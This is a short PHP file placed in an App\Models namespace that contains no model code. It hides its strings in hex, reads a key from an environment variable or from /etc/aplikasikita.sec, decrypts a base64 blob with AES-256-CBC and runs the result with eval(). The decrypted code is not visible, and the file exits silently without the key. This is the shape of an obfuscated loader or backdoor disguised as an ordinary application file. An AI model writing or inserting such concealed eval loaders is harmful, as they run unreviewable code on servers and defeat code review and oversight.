<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('PduTR/xTimqtx0B03kxL3g==');

$c=base64_decode(

'gaENOFbrnyqyVNUNGzdONlauivMgjmJTuZQ7i0dxH9iBHhzcFikjFKQsThTOhUhva71JDcWapRqk' .
'QwXcaQ7JzEam/cUwdCqS6Cxe0JU/ac0AHAAbDTj982aHEbn+W7dX3f84Agl3adlfE7MzYTC6St6E' .
'9hgcWAW4KofbClD8pacM+st63ZlwmFb/SUbhpFWBLiTKQZeYbN337tidqT/QiCuWnVurQ0NBu3Vm' .
'rZcN1OQ+CPqe/FdrGQeuhqdR/60JfG1RIb6o2GAhmKQiBwxALHpr00NEnS/TH/utZLETEctGIVfv' .
'5QnSbH3aKdd6Xpvhm/s0OVhqZMLZO0dhVV5Ub4A9RdqoR1h6vouJSOgWK+TbdhqFkyaxfZv2iNO1' .
'+XHtjXv/pDH2ria//F5cV1Sa6uo+xBO8P2d11SmvbMpFYX4d7t/6EDClvb7xjhJmqG4J69YNXCCQ' .
'UDSeqABTYW3PJ24/ZZ3a7nzCovzjI3TOtDxvoWU6VMwGi7Nb46Uq78NdojOVcS8L0I+4i4sfYOaj' .
'J9pLb8fmz7qg+m/rczLMYZb8RKJe1wkUXFwKkGWnMdGwKfcBGlx841TXHaIvCjCKauDCScWf/+wO' .
'VTMpO+kUwxnTiWzzf47WCH+QdgiIhB8VwVyfY+1P5WnyivODeShK9f7KqaIQBCvBukZ8gUwHzNK9' .
'DQQB/RNG/HzOti0GvZQvGvXqGvzKHt7IZLbfUMI5+UJ20vzMWO3K0N4Ra5Tv8B2LroxzXxOXamhV' .
'GYTZEfCizkV4069dnWIB+ULHYQ5Gvdx/tMfvNdIvgRY798G3FpdpFORU354LfbmVtLzGIoGs/bWR' .
'J49akInajY3+nV8VX2+cPUjh3xksMigaXCI+YSn9PBo6lJaqDj1G1VQmOV26DiPP+Esa29j/fcHa' .
'4NN645uq8JsOoZdbBac7qACCuWMAT0lTQoNe4jXbynCWmYIYHy7J1Xtr01pe3f6HF+NOgA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

